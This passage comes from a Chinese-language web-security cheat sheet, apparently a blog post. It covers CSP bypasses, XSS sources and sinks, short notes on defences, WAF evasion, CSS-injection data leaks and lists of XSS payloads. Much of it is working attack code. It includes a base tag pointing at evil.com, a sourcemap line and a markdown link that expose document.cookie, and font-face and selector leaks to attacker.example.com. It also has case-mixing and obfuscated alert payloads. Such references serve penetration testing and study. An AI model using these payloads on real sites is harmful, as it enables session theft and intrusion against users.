tag\"><span class=\"token punctuation\">&lt;</span>link</span> <span class=\"token attr-name\">rel</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span>preload<span class=\"token punctuation\">'</span></span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span>//xxxxx/xx.js<span class=\"token punctuation\">'</span></span><span class=\"token punctuation\">></span></span><span class=\"token comment\">&lt;!-- chrome --></span></pre></td></tr></table></figure><p>另外，不是所有的页面都能够被预加载，当资源类型如下时，将阻止预加载操作：</p>\n<ul>\n<li>URL 中包含下载资源</li>\n<li>页面中包含音频、视频</li>\n<li>POST、PUT 和 DELET 操作的 ajax 请求</li>\n<li>HTTP 认证</li>\n<li>HTTPS 页面</li>\n<li>含恶意软件的页面</li>\n<li>弹窗页面</li>\n<li>占用资源很多的页面</li>\n<li>打开了 chrome developer tools 开发工具</li>\n</ul>\n<h3 id=\"mime-sniff\"><a class=\"anchor\" href=\"#mime-sniff\">#</a> MIME Sniff</h3>\n<p>举例来说，csp 禁止跨站读取脚本，但是可以跨站读 img，那么传一个含有脚本的 img，再 <code>&lt;script href='http://xxx.com/xx.jpg'&gt;</code> ，这里 csp 认为是一个 img，绕过了检查，如果网站没有回正确的 mime type，浏览器会进行猜测，就可能加载该 img 作为脚本</p>\n<h3 id=\"302跳转\"><a class=\"anchor\" href=\"#302跳转\">#</a> 302 跳转</h3>\n<p>对于 302 跳转绕过 CSP 而言，实际上有以下几点限制：</p>\n<ul>\n<li>跳板必须在允许的域内。</li>\n<li>要加载的文件的 host 部分必须跟允许的域的 host 部分一致</li>\n</ul>\n<h3 id=\"iframe\"><a class=\"anchor\" href=\"#iframe\">#</a> iframe</h3>\n<p>当可以执行代码时，可以创建一个源为  <code>css</code>   <code>js</code>  等静态文件的 frame，在配置不当时，该 frame 并不存在 csp，则在该 frame 下再次创建 frame，达到 bypass 的目的。同理，使用  <code>../../../</code>   <code>/%2e%2e%2f</code>  等可能触发服务器报错的链接也可以到达相应的目的。</p>\n<h3 id=\"base-uri\"><a class=\"anchor\" href=\"#base-uri\">#</a> base-uri</h3>\n<p>当 script-src 为 nonce 或无限制，且 base-uri 无限制时，可通过  <code>base</code>  标签修改根 URL 来 bypass，如下加载了 http://evil.com/main.js</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>base</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://evil.com/<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">nonce</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>correct value<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>/main.js<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h3 id=\"其他\"><a class=\"anchor\" href=\"#其他\">#</a> 其他</h3>\n<ul>\n<li>\n<p>location 绕过</p>\n</li>\n<li>\n<p>可上传 SVG 时，通过恶意 SVG 绕过同源站点</p>\n</li>\n<li>\n<p>存在 CRLF 漏洞且可控点在 CSP 上方时，可以注入 HTTP 响应中影响 CSP 解析</p>\n</li>\n<li>\n<p>CND Bypass，如果网站信任了某个 CDN, 那么可利用相应 CDN 的静态资源 bypass</p>\n</li>\n<li>\n<p>Angular versions &lt;1.5.9&gt;=1.5.0，存在漏洞 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FuZ3VsYXIvYW5ndWxhci5qcy9wdWxsLzE1MzQ2\">Git Pull Request</span></p>\n</li>\n<li>\n<p>jQuery sourcemap</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>document.write(`<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>//@        sourceMappingURL=http://xxxx/`+document.cookie+`&lt;\\/script>`);``</pre></td></tr></table></figure></li>\n<li>\n<p>a 标签的 ping 属性</p>\n</li>\n<li>\n<p>For FireFox  <code>&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnSWhhdmVZb3VOb3cnKTs8L3NjcmlwdD4=&quot;&gt;</code></p>\n</li>\n<li>\n<p><code>&lt;link rel=&quot;import&quot; /&gt;</code></p>\n</li>\n<li>\n<p><code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=http://....&quot; /&gt;</code></p>\n</li>\n<li>\n<ul>\n<li>\n<p>仅限制  <code>script-src</code>  时：</p>\n<p><code>&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;</code></p>\n</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"xss数据源\"><a class=\"anchor\" href=\"#xss数据源\">#</a> XSS 数据源</h1>\n<h2 id=\"url\"><a class=\"anchor\" href=\"#url\">#</a> URL</h2>\n<ul>\n<li><code>location</code></li>\n<li><code>location.href</code></li>\n<li><code>location.pathname</code></li>\n<li><code>location.search</code></li>\n<li><code>location.hash</code></li>\n<li><code>document.URL</code></li>\n<li><code>document.documentURI</code></li>\n<li><code>document.baseURI</code></li>\n</ul>\n<h2 id=\"navigation\"><a class=\"anchor\" href=\"#navigation\">#</a> Navigation</h2>\n<ul>\n<li><code>window.name</code></li>\n<li><code>document.referrer</code></li>\n</ul>\n<h2 id=\"communication\"><a class=\"anchor\" href=\"#communication\">#</a> Communication</h2>\n<ul>\n<li><code>Ajax</code></li>\n<li><code>Fetch</code></li>\n<li><code>WebSocket</code></li>\n<li><code>PostMessage</code></li>\n</ul>\n<h2 id=\"storage\"><a class=\"anchor\" href=\"#storage\">#</a> Storage</h2>\n<ul>\n<li><code>Cookie</code></li>\n<li><code>LocalStorage</code></li>\n<li><code>SessionStorage</code></li>\n</ul>\n<h1 id=\"sink\"><a class=\"anchor\" href=\"#sink\">#</a> Sink</h1>\n<h2 id=\"执行javascript\"><a class=\"anchor\" href=\"#执行javascript\">#</a> 执行 JavaScript</h2>\n<ul>\n<li><code>eval(payload)</code></li>\n<li><code>setTimeout(payload, 100)</code></li>\n<li><code>setInterval(payload, 100)</code></li>\n<li><code>Function(payload)()</code></li>\n<li><code>&lt;script&gt;payload&lt;/script&gt;</code></li>\n<li><code>&lt;img src=x onerror=payload&gt;</code></li>\n</ul>\n<h2 id=\"加载url\"><a class=\"anchor\" href=\"#加载url\">#</a> 加载 URL</h2>\n<ul>\n<li><code>location=javascript:alert(/xss/)</code></li>\n<li><code>location.href=javascript:alert(/xss/)</code></li>\n<li><code>location.assign(javascript:alert(/xss/))</code></li>\n<li><code>location.replace(javascript:alert(/xss/))</code></li>\n</ul>\n<h2 id=\"执行html\"><a class=\"anchor\" href=\"#执行html\">#</a> 执行 HTML</h2>\n<ul>\n<li><code>xx.innerHTML=payload</code></li>\n<li><code>xx.outerHTML=payload</code></li>\n<li><code>document.write(payload)</code></li>\n<li><code>document.writeln(payload)</code></li>\n</ul>\n<h1 id=\"xss保护\"><a class=\"anchor\" href=\"#xss保护\">#</a> XSS 保护</h1>\n<h2 id=\"html过滤\"><a class=\"anchor\" href=\"#html过滤\">#</a> HTML 过滤</h2>\n<p>使用一些白名单或者黑名单来过滤用户输入的 HTML，以实现过滤的效果。例如 DOMPurify 等工具都是用该方式实现了 XSS 的保护。</p>\n<h2 id=\"x-frame\"><a class=\"anchor\" href=\"#x-frame\">#</a> X-Frame</h2>\n<p>X-Frame-Options 响应头有三个可选的值：</p>\n<ul>\n<li>DENY\n<ul>\n<li>页面不能被嵌入到任何 iframe 或 frame 中</li>\n</ul>\n</li>\n<li>SAMEORIGIN\n<ul>\n<li>页面只能被本站页面嵌入到 iframe 或者 frame 中</li>\n</ul>\n</li>\n<li>ALLOW-FROM\n<ul>\n<li>页面允许 frame 或 frame 加载</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"xss保护头\"><a class=\"anchor\" href=\"#xss保护头\">#</a> XSS 保护头</h2>\n<p>基于 Webkit 内核的浏览器 (比如 Chrome) 在特定版本范围内有一个名为 XSS auditor 的防护机制，如果浏览器检测到了含有恶意代码的输入被呈现在 HTML 文档中，那么这段呈现的恶意代码要么被删除，要么被转义，恶意代码不会被正常的渲染出来。</p>\n<p>而浏览器是否要拦截这段恶意代码取决于浏览器的 XSS 防护设置。</p>\n<p>要设置浏览器的防护机制，则可使用 X-XSS-Protection 字段 该字段有三个可选的值</p>\n<ul>\n<li><code>0</code>  : 表示关闭浏览器的 XSS 防护机制</li>\n<li><code>1</code>  : 删除检测到的恶意代码， 如果响应报文中没有看到 X-XSS-Protection 字段，那么浏览器就认为 X-XSS-Protection 配置为 1，这是浏览器的默认设置</li>\n<li><code>1; mode=block</code>  : 如果检测到恶意代码，在不渲染恶意代码</li>\n</ul>\n<p>FireFox 没有相关的保护机制，如果需要保护，可使用 NoScript 等相关插件。</p>\n<h1 id=\"waf-bypass\"><a class=\"anchor\" href=\"#waf-bypass\">#</a> WAF Bypass</h1>\n<ul>\n<li>\n<p>利用 &lt;&gt; 标记</p>\n</li>\n<li>\n<p>利用 html 属性</p>\n<ul>\n<li>href</li>\n<li>lowsrc</li>\n<li>bgsound</li>\n<li>background</li>\n<li>value</li>\n<li>action</li>\n<li>dynsrc</li>\n</ul>\n</li>\n<li>\n<p>关键字</p>\n<ul>\n<li>利用回车拆分</li>\n<li>字符串拼接\n<ul>\n<li><code>window[&quot;al&quot; + &quot;ert&quot;]</code></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p>利用编码绕过</p>\n<ul>\n<li>base64</li>\n<li>jsfuck</li>\n<li>String.fromCharCode</li>\n<li>HTML</li>\n<li>URL</li>\n<li>hex\n<ul>\n<li><code>window[&quot;\\x61\\x6c\\x65\\x72\\x74&quot;]</code></li>\n</ul>\n</li>\n<li>unicode</li>\n<li>utf7\n<ul>\n<li><code>+ADw-script+AD4-alert('XSS')+ADsAPA-/script+AD4-</code></li>\n</ul>\n</li>\n<li>utf16</li>\n</ul>\n</li>\n<li>\n<p>大小写混淆</p>\n</li>\n<li>\n<p>对标签属性值转码</p>\n</li>\n<li>\n<p>产生事件</p>\n</li>\n<li>\n<p>css 跨站解析</p>\n</li>\n<li>\n<p>长度限制 bypass</p>\n<ul>\n<li><code>eval(name)</code></li>\n<li><code>eval(hash)</code></li>\n<li><code>import</code></li>\n<li><code>$.getScript</code></li>\n<li><code>$.get</code></li>\n</ul>\n</li>\n<li>\n<p><code>.</code></p>\n<ul>\n<li>使用  <code>。</code>  绕过 IP / 域名</li>\n<li><code>document['cookie']</code>  绕过属性取值</li>\n</ul>\n</li>\n<li>\n<p>过滤引号用  <code>`</code>  绕过</p>\n</li>\n</ul>\n<h1 id=\"技巧\"><a class=\"anchor\" href=\"#技巧\">#</a> 技巧</h1>\n<h2 id=\"httponly\"><a class=\"anchor\" href=\"#httponly\">#</a> httponly</h2>\n<ul>\n<li>在 cookie 为 httponly 的情况下，可以通过 xss 直接在源站完成操作，不直接获取 cookie。</li>\n<li>在有登录操作的情况下，部分站点直接发送登录请求可能会带有 cookie</li>\n<li>部分特定版本的浏览器可能会在 httponly 支持 / 处理上存在问题</li>\n<li>低版本浏览器支持 TRACE / TRACK，可获取敏感的 header 字段</li>\n<li>phpinfo 等页面可能会回显信息，这些信息中包含 http 头</li>\n<li>通过 xss 劫持页面钓鱼</li>\n<li>通过 xss 伪造 oauth 等授权请求，远程登录</li>\n</ul>\n<h2 id=\"css注入\"><a class=\"anchor\" href=\"#css注入\">#</a> CSS 注入</h2>\n<h3 id=\"基本介绍\"><a class=\"anchor\" href=\"#基本介绍\">#</a> 基本介绍</h3>\n<p>CSS 注入最早开始于利用 CSS 中的  <code>expression()</code>   <code>url()</code>   <code>regex()</code>  等函数或特性来引入外部的恶意代码，但是随着浏览器的发展，这种方式被逐渐禁用，与此同时，出现了一些新的攻击方式。</p>\n<h3 id=\"css-selectors\"><a class=\"anchor\" href=\"#css-selectors\">#</a> CSS selectors</h3>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\"></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token selector\">#form2 input[value^='a']</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token property\">background-image</span><span class=\"token punctuation\">:</span> <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span>http://localhost/log.php/a<span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token selector\">#form2 input[value^='b']</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token property\">background-image</span><span class=\"token punctuation\">:</span> <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span>http://localhost/log.php/b<span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token selector\">#form2 input[value^='c']</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token property\">background-image</span><span class=\"token punctuation\">:</span> <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span>http://localhost/log.php/c<span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    [...]</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://example.com<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>form2<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>secret<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>secret<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>abc<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>上图是利用 CSS selectors 完成攻击的一个示例</p>\n<h3 id=\"abusing-unicode-range\"><a class=\"anchor\" href=\"#abusing-unicode-range\">#</a> Abusing Unicode Range</h3>\n<p>当可以插入 CSS 的时候，可以使用  <code>font-face</code>  配合  <code>unicode-range</code>  获取目标网页对应字符集。PoC 如下</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\"></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token atrule\"><span class=\"token rule\">@font-face</span></span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> <span class=\"token property\">font-family</span><span class=\"token punctuation\">:</span>poc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre> <span class=\"token property\">src</span><span class=\"token punctuation\">:</span> <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span>http://attacker.example.com/?A<span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* fetched */</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> <span class=\"token property\">unicode-range</span><span class=\"token punctuation\">:</span>U+0041<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token atrule\"><span class=\"token rule\">@font-face</span></span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> <span class=\"token property\">font-family</span><span class=\"token punctuation\">:</span>poc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> <span class=\"token property\">src</span><span class=\"token punctuation\">:</span> <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span>http://attacker.example.com/?B<span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* fetched too */</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> <span class=\"token property\">unicode-range</span><span class=\"token punctuation\">:</span>U+0042<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token atrule\"><span class=\"token rule\">@font-face</span></span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre> <span class=\"token property\">font-family</span><span class=\"token punctuation\">:</span>poc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre> <span class=\"token property\">src</span><span class=\"token punctuation\">:</span> <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span>http://attacker.example.com/?C<span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* not fetched */</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre> <span class=\"token property\">unicode-range</span><span class=\"token punctuation\">:</span>U+0043<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token selector\">#sensitive-information</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre> <span class=\"token property\">font-family</span><span class=\"token punctuation\">:</span>poc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>sensitive-information<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>AB<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>当字符较多时，则可以结合  <code>::first-line</code>  等 CSS 属性缩小范围，以获取更精确的内容</p>\n<h2 id=\"bypass-via-script-gadgets\"><a class=\"anchor\" href=\"#bypass-via-script-gadgets\">#</a> Bypass Via Script Gadgets</h2>\n<h3 id=\"简介-3\"><a class=\"anchor\" href=\"#简介-3\">#</a> 简介</h3>\n<p>一些网站会使用白名单或者一些基于 DOM 的防御方式，对这些方式，有一种被称为  <code>Code Reuse</code>  的攻击方式可以绕过。该方式和二进制攻防中的 Gadget 相似，使用目标中的合法代码来达到绕过防御措施的目的。在论文  <code>Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets</code>  中有该方法的具体描述。</p>\n<p>portswigger 的一篇博文也表达了类似的想法  <code>https://portswigger.net/blog/abusing-javascript-frameworks-to-bypass-xss-mitigations</code> 。</p>\n<p>下面有一个简单的例子，这个例子使用了  <code>DOMPurify</code>  来加固，但是因为引入了  <code>jquery.mobile.js</code>  导致可以被攻击。</p>\n<h3 id=\"例子\"><a class=\"anchor\" href=\"#例子\">#</a> 例子</h3>\n<pre><code class=\"language-php+HTML\">// index.php\n&lt;?php\n\n$msg = $_GET['message'];\n$msg = str_replace(&quot;\\n&quot;, &quot;&quot;, $msg);\n$msg = base64_encode($msg);\n\n?&gt;\n\n&lt;!DOCTYPE html&gt;\n&lt;html lang=&quot;en&quot;&gt;\n&lt;head&gt;\n    &lt;meta charset=&quot;UTF-8&quot;&gt;\n    &lt;title&gt;Preview&lt;/title&gt;\n    &lt;script type=&quot;text/javascript&quot; src=&quot;purify.js&quot;&gt;&lt;/script&gt;\n    &lt;script type=&quot;text/javascript&quot; src=&quot;jquery.js&quot;&gt;&lt;/script&gt;\n    &lt;script type=&quot;text/javascript&quot; src=&quot;jquery.mobile.js&quot;&gt;&lt;/script&gt;\n&lt;/head&gt;\n&lt;body&gt;\n\n    &lt;script type=&quot;text/javascript&quot;&gt;\n    var d= atob('&lt;?php echo $msg; ?&gt;');\n    var cleanvar = DOMPurify.sanitize(d);\n    document.write(cleanvar);\n    &lt;/script&gt;\n\n&lt;/body&gt;\n&lt;/html&gt;\n// payload\n&lt;div data-role=popup id='--&gt;\n&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;'&gt;\n&lt;/div&gt;\n</code></pre>\n<h2 id=\"rporelative-path-overwrite\"><a class=\"anchor\" href=\"#rporelative-path-overwrite\">#</a> RPO(Relative Path Overwrite)</h2>\n<p>RPO (Relative Path Overwrite) 攻击又称为相对路径覆盖攻击，依赖于浏览器和网络服务器的反应，利用服务器的 Web 缓存技术和配置差异。</p>\n<h1 id=\"payload\"><a class=\"anchor\" href=\"#payload\">#</a> Payload</h1>\n<h2 id=\"常用\"><a class=\"anchor\" href=\"#常用\">#</a> 常用</h2>\n<ul>\n<li><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></li>\n<li><code>&lt;svg onload=alert(document.domain)&gt;</code></li>\n<li><code>&lt;img src=document.domain onerror=alert(document.domain)&gt;</code></li>\n<li><code>&lt;M onmouseover=alert(document.domain)&gt;M</code></li>\n<li><code>&lt;marquee onscroll=alert(document.domain)&gt;</code></li>\n<li><code>&lt;a href=javascript:alert(document.domain)&gt;M&lt;/a&gt;</code></li>\n<li><code>&lt;body onload=alert(document.domain)&gt;</code></li>\n<li><code>&lt;details open ontoggle=alert(document.domain)&gt;</code></li>\n<li><code>&lt;embed src=javascript:alert(document.domain)&gt;</code></li>\n</ul>\n<h2 id=\"大小写绕过\"><a class=\"anchor\" href=\"#大小写绕过\">#</a> 大小写绕过</h2>\n<ul>\n<li><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>\n<li><code>&lt;sCrIpT&gt;alert(1)&lt;/sCrIpT&gt;</code></li>\n<li><code>&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</code></li>\n<li><code>&lt;sCrIpT&gt;alert(1)&lt;/ScRiPt&gt;</code></li>\n<li><code>&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;</code></li>\n<li><code>&lt;img src=1 onerror=alert(1)&gt;</code></li>\n<li><code>&lt;iMg src=1 oNeRrOr=alert(1)&gt;</code></li>\n<li><code>&lt;ImG src=1 OnErRoR=alert(1)&gt;</code></li>\n<li><code>&lt;img src=1 onerror=&quot;alert(&quot;M&quot;)&quot;&gt;</code></li>\n<li><code>&lt;marquee onscroll=alert(1)&gt;</code></li>\n<li><code>&lt;mArQuEe OnScRoLl=alert(1)&gt;</code></li>\n<li><code>&lt;MaRqUeE oNsCrOlL=alert(1)&gt;</code></li>\n</ul>\n<h2 id=\"各种alert\"><a class=\"anchor\" href=\"#各种alert\">#</a> 各种 alert</h2>\n<ul>\n<li><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;confirm(1)&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;prompt(1)&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;alert('1')&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;alert(&quot;1&quot;)&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;alert</code> 1 <code>&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;(alert)(1)&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;a=alert,a(1)&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;[1].find(alert)&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](1)&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;top[&quot;a&quot;+&quot;l&quot;+&quot;e&quot;+&quot;r&quot;+&quot;t&quot;](1)&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;top[/al/.source+/ert/.source](1)&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;top[/a/.source+/l/.source+/e/.source+/r/.source+/t/.source](1)&lt;/script&gt;</code></li>\n</ul>\n<h2 id=\"伪协议\"><a class=\"anchor\" href=\"#伪协议\">#</a> 伪协议</h2>\n<ul>\n<li><code>&lt;a href=javascript:/0/,alert(%22M%22)&gt;M&lt;/a&gt;</code></li>\n<li><code>&lt;a href=javascript:/00/,alert(%22M%22)&gt;M&lt;/a&gt;</code></li>\n<li><code>&lt;a href=javascript:/000/,alert(%22M%22)&gt;M&lt;/a&gt;</code></li>\n<li><code>&lt;a href=javascript:/M/,alert(%22M%22)&gt;M&lt;/a&gt;</code></li>\n</ul>\n<h2 id=\"chrome-xss-auditor-bypass\"><a class=\"anchor\" href=\"#chrome-xss-auditor-bypass\">#</a> Chrome XSS auditor bypass</h2>\n<ul>\n<li><code>?param=https://&amp;param=@z.exeye.io/import%20rel=import%3E</code></li>\n<li><code>&lt;base href=javascript:/M/&gt;&lt;a href=,alert(1)&gt;M&lt;/a&gt;</code></li>\n<li><code>&lt;base href=javascript:/M/&gt;&lt;iframe src=,alert(1)&gt;&lt;/iframe&gt;</code></li>\n</ul>\n<h2 id=\"长度限制\"><a class=\"anchor\" href=\"#长度限制\">#</a> 长度限制</h2>\n<pre><code>&lt;script&gt;s+=&quot;l&quot;&lt;/script&gt;\n\\...\n&lt;script&gt;eval(s)&lt;/script&gt;\n</code></pre>\n<h2 id=\"jquery-sourcemappingurl\"><a class=\"anchor\" href=\"#jquery-sourcemappingurl\">#</a> jquery sourceMappingURL</h2>\n<pre><code>&lt;/textarea&gt;&lt;script&gt;var a=1//@ sourceMappingURL=//xss.site&lt;/script&gt;\n</code></pre>\n<h2 id=\"图片名\"><a class=\"anchor\" href=\"#图片名\">#</a> 图片名</h2>\n<pre><code>&quot;&gt;&lt;img src=x onerror=alert(document.cookie)&gt;.gif\n</code></pre>\n<h2 id=\"过期的payload\"><a class=\"anchor\" href=\"#过期的payload\">#</a> 过期的 payload</h2>\n<ul>\n<li>src=javascript:alert 基本不可以用</li>\n<li>css expression 特性只在旧版本 ie 可用</li>\n</ul>\n<h2 id=\"css\"><a class=\"anchor\" href=\"#css\">#</a> css</h2>\n<pre><code>&lt;div style=&quot;background-image:url(javascript:alert(/xss/))&quot;&gt;\n&lt;STYLE&gt;@import'http://ha.ckers.org/xss.css';&lt;/STYLE&gt;\n</code></pre>\n<h2 id=\"markdown\"><a class=\"anchor\" href=\"#markdown\">#</a> markdown</h2>\n<pre><code>[a](javascript:prompt(document.cookie))\n[a](j    a   v   a   s   c   r   i   p   